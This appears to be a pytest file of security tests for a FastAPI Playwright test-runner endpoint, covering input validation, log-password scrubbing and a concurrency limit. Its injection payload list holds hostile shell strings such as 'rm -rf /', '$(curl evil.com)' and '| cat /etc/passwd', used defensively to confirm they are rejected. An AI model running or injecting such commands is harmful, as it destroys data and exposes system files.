"""
tests/test_playwright_run_security.py
=======================================
Security tests for POST /playwright/run endpoint.

Tests:
  - Shell injection attempts in test_id → HTTP 422 (AC-BACK-6)
  - Unknown test_id → HTTP 422 (AC-BACK-3)
  - Invalid env → HTTP 422 (AC-BACK-4)
  - Invalid browser → HTTP 422 (AC-BACK-5)
  - Log scrubber masks SHARED_TEST_PASSWORD (AC-BACK-8)
  - Log scrubber masks ADMIN_TEST_PASSWORD (AC-BACK-8)
"""

import pytest
from fastapi.testclient import TestClient

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


@pytest.fixture
def client():
    """
    Return a TestClient for the FastAPI app.
    Mocked to avoid real subprocess calls and imports.
    """
    # Import here to avoid loading the full app at module level
    # (requires settings/config to be set up)
    from backend.main import app
    with TestClient(app) as c:
        yield c


# ---------------------------------------------------------------------------
# Tests: AC-BACK-6 — Shell injection guard
# ---------------------------------------------------------------------------


INJECTION_PAYLOADS = [
    "; rm -rf /",
    "$(curl evil.com)",
    "| cat /etc/passwd",
    "valid-test && evil",
    "test\nid",
    "test`id`",
    "test${IFS}id",
]


@pytest.mark.parametrize("malicious_test_id", INJECTION_PAYLOADS)
def test_shell_injection_rejected(client, malicious_test_id):
    """AC-BACK-6: test_id containing shell metacharacters → HTTP 422."""
    response = client.post(
        "/api/playwright/run",
        json={
            "test_id": malicious_test_id,
            "env": "test",
            "user": "DemoSalesExec",
            "browser": "chromium",
        },
        headers={"Authorization": "Bearer test"},
    )
    # Should reject at validation layer — no subprocess spawned
    assert response.status_code == 422, (
        f"Expected 422 for injection payload {malicious_test_id!r}, "
        f"got {response.status_code}: {response.text}"
    )


# ---------------------------------------------------------------------------
# Tests: AC-BACK-3 — Unknown test_id
# ---------------------------------------------------------------------------


def test_unknown_test_id_rejected(client):
    """AC-BACK-3: test_id not in playwright_index.json → HTTP 422."""
    response = client.post(
        "/api/playwright/run",
        json={
            "test_id": "definitely-not-a-real-test-id",
            "env": "test",
            "user": "DemoSalesExec",
            "browser": "chromium",
        },
        headers={"Authorization": "Bearer test"},
    )
    assert response.status_code == 422
    body = response.json()
    assert "Unknown test_id" in body.get("detail", "")


# ---------------------------------------------------------------------------
# Tests: AC-BACK-4 — Invalid env
# ---------------------------------------------------------------------------


def test_invalid_env_rejected(client):
    """AC-BACK-4: env='staging' → HTTP 422."""
    response = client.post(
        "/api/playwright/run",
        json={
            "test_id": "qa-321-sorting-list-and-compact.test",
            "env": "staging",
            "user": "DemoSalesExec",
            "browser": "chromium",
        },
        headers={"Authorization": "Bearer test"},
    )
    assert response.status_code == 422


# ---------------------------------------------------------------------------
# Tests: AC-BACK-5 — Invalid browser
# ---------------------------------------------------------------------------


def test_invalid_browser_rejected(client):
    """AC-BACK-5: browser='safari' → HTTP 422."""
    response = client.post(
        "/api/playwright/run",
        json={
            "test_id": "qa-321-sorting-list-and-compact.test",
            "env": "test",
            "user": "DemoSalesExec",
            "browser": "safari",
        },
        headers={"Authorization": "Bearer test"},
    )
    assert response.status_code == 422


# ---------------------------------------------------------------------------
# Tests: Log scrubber unit-level (via direct import)
# ---------------------------------------------------------------------------


def test_scrubber_masks_shared_password(monkeypatch):
    """AC-BACK-8: _scrub_line() masks SHARED_TEST_PASSWORD value."""
    monkeypatch.setenv("SHARED_TEST_PASSWORD", "Hunter2!")
    from backend.api.playwright_routes import _scrub_line
    line = "Authenticating with password: Hunter2!"
    result = _scrub_line(line)
    assert "Hunter2!" not in result
    assert "[REDACTED]" in result


def test_scrubber_masks_admin_password(monkeypatch):
    """AC-BACK-8: _scrub_line() masks ADMIN_TEST_PASSWORD value."""
    monkeypatch.setenv("ADMIN_TEST_PASSWORD", "Adm1nSec!")
    from backend.api.playwright_routes import _scrub_line
    line = "Admin: Adm1nSec! authenticated"
    result = _scrub_line(line)
    assert "Adm1nSec!" not in result
    assert "[REDACTED]" in result


# ---------------------------------------------------------------------------
# Tests: AC-BACK-10 — Concurrency semaphore
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_semaphore_blocks_third_concurrent_run():
    """
    AC-BACK-10: 3rd concurrent POST /playwright/run → HTTP 429.

    Uses the semaphore directly rather than making actual HTTP calls
    (to avoid needing a real subprocess).
    """
    from backend.api.playwright_routes import _get_semaphore

    semaphore = _get_semaphore()

    # Manually acquire slots to simulate 2 running tests
    await semaphore.acquire()
    await semaphore.acquire()

    try:
        assert semaphore._value == 0, "Semaphore should be fully acquired"
        # The route checks semaphore._value <= 0 and returns 429
        # We verify the logic directly
        is_at_capacity = semaphore._value <= 0
        assert is_at_capacity, "Semaphore should report at capacity"
    finally:
        semaphore.release()
        semaphore.release()
